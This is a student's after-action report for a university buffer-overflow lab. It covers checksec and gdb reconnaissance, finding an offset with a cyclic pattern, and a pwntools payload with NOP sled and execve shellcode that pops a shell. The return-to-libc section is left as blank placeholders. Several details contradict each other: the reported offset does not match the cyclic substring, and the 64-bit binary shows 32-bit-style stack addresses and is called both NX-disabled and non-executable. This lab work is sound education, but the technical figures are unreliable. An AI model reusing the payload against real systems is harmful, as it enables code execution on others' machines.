---
real-name: Oswald Cobblepot
csulb-id: "040100105"
handle: penguin
seed-fingerprint: bb11cc
flag1: CECS378{sm4sh3d_th3_st4ck_bb11cc}
flag2: "[your answer]"
honor-flag: CECS378{i_did_my_own_w0rk_penguin_bb11cc}
---

# After-Action Report -- Buffer Overflow Lab

[--[ 0.0 -- TARGET ]--]

- Course: CECS 378 -- Introduction to Computer Security Principles (Su26, section 01)
- Assignment: Lab 3 -- Buffer Overflow
- Handle: penguin
- Seed fingerprint: bb11cc
- Environment: Ubuntu 22.04 LTS in the provided course VM, x86-64, gdb 12.1, pwndbg loaded
- ASLR: disabled for the lab per the handout (`/proc/sys/kernel/randomize_va_space` = 0)
- Started: 2026-06-25
- Submitted: 2026-06-28

Both target binaries (`ace` for Phase Phi and the same binary reused for Phase Omega) came out of the seed bundle stamped bb11cc. I confirmed the fingerprint matched the one printed in the assignment portal before I started so I wasn't grading the wrong binary.

[--[ 1.0 -- RECON ]--]

I started with the usual protections check and then went into gdb to find the offset.

```
$ checksec --file=ace
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
```

No canary and NX disabled, so a classic stack smash with shellcode on the stack should be fine for Phase Phi.

I ran the binary under gdb and fed it a cyclic pattern to find where the return address gets overwritten.

```
pwndbg> cyclic 200
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa...
pwndbg> run
Starting program: /home/student/ace
> [paste pattern]

Program received signal SIGSEGV, Segmentation fault.
0x00000000004011c6 in vuln ()
pwndbg> x/wx $rsp
0xffffd2a8: 0x6161616e
pwndbg> cyclic -l 0x6161616e
Finding cyclic pattern of 4 bytes: b'naaa' (hex: 0x6e616161)
Found at offset 72
```

So the offset to the saved return address is **72 bytes**. That lines up with the `char buf[64]` I could see in the disassembly plus the 8 bytes of saved RBP.

```
pwndbg> disass vuln
   0x0000000000401156 <+0>:  push   rbp
   0x0000000000401157 <+1>:  mov    rbp,rsp
   0x000000000040115a <+4>:  sub    rsp,0x40
   0x000000000040115e <+8>:  lea    rax,[rbp-0x40]
   ...
   0x00000000004011a8 <+?>:  call   0x401050 <gets@plt>
```

`gets()` into a 64-byte buffer, no bounds checking. That's the bug.

I did not spend much time mapping out the Omega path binary separately -- I mostly reused what I found here.

[--[ 2.0 -- PHASE PHI ACE ]--]

For Phase Phi the goal was to overwrite the return address and jump to shellcode placed on the stack.

My plan:
1. Fill 72 bytes to reach the return address.
2. Overwrite the return address with the stack address of my shellcode.
3. Put a NOP sled + execve("/bin/sh") shellcode after the return address.

I used a standard 23-byte execve shellcode and padded a NOP sled in front of it so I had margin on the landing address. The stack address I jumped to was `0xffffd2c0`, which I read off `$rsp` at the crash.

```python
from pwn import *

offset = 72
sled   = b"\x90" * 40
shell  = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57..."
ret    = p64(0xffffd2c0)

payload = b"A"*offset + ret + sled + shell
```

I piped it into the binary and got a shell, and `cat flag1.txt` printed the flag:

```
$ (python3 exploit_phi.py; cat) | ./ace
$ id
uid=1000(student) ...
$ cat flag1.txt
CECS378{sm4sh3d_th3_st4ck_bb11cc}
```

![phi shell popped](screenshots/phi_shell.png)

![gdb offset find](screenshots/gdb_offset.png)

The flag matched my seed fingerprint so I'm confident it's the right one for my binary.

[--[ 3.0 -- PHASE OMEGA ACE ]--]

For Phase Omega the stack was non-executable so I needed a return-to-libc / ROP approach instead of shellcode.

**Sub-part 1 -- why shellcode fails here:** [your answer]

**Sub-part 2 -- gadgets / libc addresses used:** [your answer]

**Sub-part 3 -- the ROP chain layout (pop rdi, /bin/sh, system):** [your answer]

**Sub-part 4 -- proof of shell + flag2:** [your answer]

flag2: [your answer]

[--[ 4.0 -- AFTERMATH ]--]

**Reflection 1 -- what actually clicked.** The thing that finally made stack smashing make sense to me was watching `$rsp` and `$rip` in gdb at the moment of the crash. Before this lab I understood "you overwrite the return address" as words, but seeing the exact four bytes of my cyclic pattern sitting in RIP, and then being able to compute the offset from that, turned it into something concrete. The cyclic pattern trick is going to stick with me.

**Reflection 2 -- the defensive takeaway.** The whole Phase Phi attack only worked because NX was off, there was no canary, and the binary used `gets()`. Any one of those three defenses would have broken my exploit. It drove home that these mitigations aren't academic -- a single `fgets()` with a length, or a stack canary, would have stopped me cold. When I write C going forward I'm never going to use an unbounded read again.
